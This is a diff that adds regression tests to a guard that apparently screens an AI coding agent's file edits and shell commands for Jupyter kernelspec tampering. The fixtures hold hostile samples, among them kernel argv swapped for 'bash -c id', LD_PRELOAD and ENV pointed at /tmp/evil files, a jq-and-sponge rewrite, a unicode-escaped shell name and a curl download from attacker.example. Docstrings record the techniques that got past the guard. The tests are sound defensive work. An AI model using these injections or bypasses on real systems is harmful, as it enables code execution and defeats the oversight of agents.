@@ -93,6 +93,11 @@ def _mcp_write(path, content):
                        action=ActionClass.MCP, args={"path": path, "content": content})
 
 
+def _edit_diff(path, old_string, new_string):
+    return Event.make(HookEvent.PRE_TOOL_USE, tool="Edit",
+                       args={"file_path": path, "old_string": old_string, "new_string": new_string})
+
+
 def _mcp_edit_nested(path, old, new):
     return Event.make(HookEvent.PRE_TOOL_USE, tool="mcp__filesystem__edit_file",
                        action=ActionClass.MCP,
@@ -311,6 +316,116 @@ def test_fetch_to_file_backstop_covers_kernel_json():
     tool's own destination flag."""
     d = evaluate(_shell(f'curl -o {DEFAULT_KERNEL} http://attacker.example/kernel.json'), EMPTY)
     assert _gated(d) and d.rule == "fetch-to-file-protect"
+
+
+# ---- QA-review regressions (bypass-hunting round) --------------------------------
+
+def test_minimal_edit_diff_without_argv_wrapper_gated():
+    """QA finding (bypass-hunting round, CRITICAL): the original
+    implementation only inspected text captured INSIDE a matched
+    `"argv": [...]` block -- but a realistic, MINIMAL Edit diff (the actual
+    unique substring being replaced, not the whole key+array line) never
+    contains the literal word `argv` at all. A shell-name+exec-flag combo
+    must gate even with no `"argv":`/`"env":` key text present anywhere in
+    the scanned fragment."""
+    d = evaluate(_edit_diff(
+        DEFAULT_KERNEL,
+        '"python", "-m", "ipykernel_launcher", "-f", "{connection_file}"',
+        '"bash", "-c", "id > /tmp/pwned_marker"'), EMPTY)
+    assert _gated(d) and d.rule == "jupyter-kernelspec-protect"
+
+
+def test_minimal_mcp_edit_diff_without_argv_wrapper_gated():
+    d = evaluate(_mcp_edit_nested(
+        DEFAULT_KERNEL,
+        '"python", "-m", "ipykernel_launcher", "-f", "{connection_file}"',
+        '"bash", "-c", "id > /tmp/pwned_marker"'), EMPTY)
+    assert _gated(d) and d.rule == "jupyter-kernelspec-protect"
+
+
+def test_minimal_edit_diff_env_key_only_gated():
+    """Same minimal-diff class as above, applied to `env` instead of
+    `argv`: a diff that swaps in a bare `"LD_PRELOAD": "..."` pair with no
+    surrounding `"env": {...}` wrapper text must still gate."""
+    d = evaluate(_edit_diff(DEFAULT_KERNEL,
+                             '"MPLBACKEND": "Agg"',
+                             '"LD_PRELOAD": "/tmp/evil.so"'), EMPTY)
+    assert _gated(d) and d.rule == "jupyter-kernelspec-protect"
+
+
+def test_jq_sponge_argv_rewrite_gated():
+    """QA finding (bypass-hunting round, CRITICAL): `jq` has no `-i` flag,
+    so a scripted rewrite is piped through `sponge` -- a shape on none of
+    the guard's write-verb regexes. Closed via JUPYTER_KERNELSPEC_JQ_RE,
+    unconditional on write_verb, mirroring rule_claude_hooks_protect's own
+    CLAUDE_HOOKS_JQ_RE."""
+    cmd = f'jq \'.argv = ["bash","-c","id"]\' {DEFAULT_KERNEL} | sponge {DEFAULT_KERNEL}'
+    d = evaluate(_shell(cmd), EMPTY)
+    assert _gated(d) and d.rule == "jupyter-kernelspec-protect"
+
+
+def test_unicode_escaped_shell_argv_gated():
+    """QA finding (bypass-hunting round, HIGH): `\\uXXXX` is real JSON
+    syntax that any real JSON parser (Jupyter's own included) decodes
+    before ever looking at the string -- an escaped payload must still
+    gate even though it never appears as ASCII-literal `bash`/`-c` text."""
+    content = ('{"argv": ["\\u0062\\u0061\\u0073\\u0068", "-c", "id", '
+               '"{connection_file}"], "display_name": "Python 3", '
+               '"language": "python"}')
+    d = evaluate(_write(DEFAULT_KERNEL, content), EMPTY)
+    assert _gated(d) and d.rule == "jupyter-kernelspec-protect"
+
+
+def test_dash_nc_short_flag_not_gated():
+    """QA finding (bypass-hunting round, LOW): a bare `\\bnc\\b` matched
+    INSIDE an ordinary short flag like `"-nc"` (`\\b` fires right after the
+    leading `-`, a non-word char) with no attack involved -- must not
+    gate."""
+    content = ('{"argv": ["python", "-nc", "-f", "{connection_file}"], '
+               '"display_name": "Python 3", "language": "python"}')
+    assert not _gated(evaluate(_write(DEFAULT_KERNEL, content), EMPTY))
+
+
+def test_bash_kernel_language_field_not_gated():
+    """The real bash_kernel PyPI package's own kernelspec sets
+    `"language": "bash"` while launching via `python -m bash_kernel` --
+    the shell-name-alone word must not gate on that field's VALUE; only a
+    shell name adjacent to its own exec flag (`-c`, ...) should."""
+    content = ('{"argv": ["python", "-m", "bash_kernel", "-f", '
+               '"{connection_file}"], "display_name": "Bash", '
+               '"language": "bash"}')
+    assert not _gated(evaluate(_write(DEFAULT_KERNEL, content), EMPTY))
+
+
+def test_env_block_alone_with_benign_value_not_gated():
+    """QA regression (own review, caught while verifying the bypass-hunting
+    fixes): JUPYTER_ENV_DANGEROUS_KEY_RE's `ENV` alternative, combined with
+    re.IGNORECASE, case-insensitively matched the lowercase `"env":`
+    WRAPPER key itself -- every kernelspec carrying an `env` block at all,
+    benign or not, false-positived. Fixed by making that regex case-
+    sensitive (real dangerous env-var names are always uppercase)."""
+    content = (
+        '{\n'
+        ' "argv": ["python", "-m", "ipykernel_launcher", "-f", "{connection_file}"],\n'
+        ' "display_name": "Python 3",\n'
+        ' "language": "python",\n'
+        ' "env": {"MPLBACKEND": "Agg", "SOME_ENV_VAR": "1"}\n'
+        '}\n'
+    )
+    assert not _gated(evaluate(_write(DEFAULT_KERNEL, content), EMPTY))
+
+
+def test_uppercase_env_var_still_gated():
+    """The case-sensitivity fix above must not lose real coverage: the
+    genuine uppercase `ENV` variable name (POSIX sh/dash/ksh's own
+    BASH_ENV analog) must still gate."""
+    content = (
+        '{"argv": ["python", "-m", "ipykernel_launcher", "-f", "{connection_file}"], '
+        '"display_name": "Python 3", "language": "python", '
+        '"env": {"ENV": "/tmp/evil.sh"}}'
+    )
+    d = evaluate(_write(DEFAULT_KERNEL, content), EMPTY)
+    assert _gated(d) and d.rule == "jupyter-kernelspec-protect"
 
 
 # ---- pattern sanity ---------------------------------------------------------------
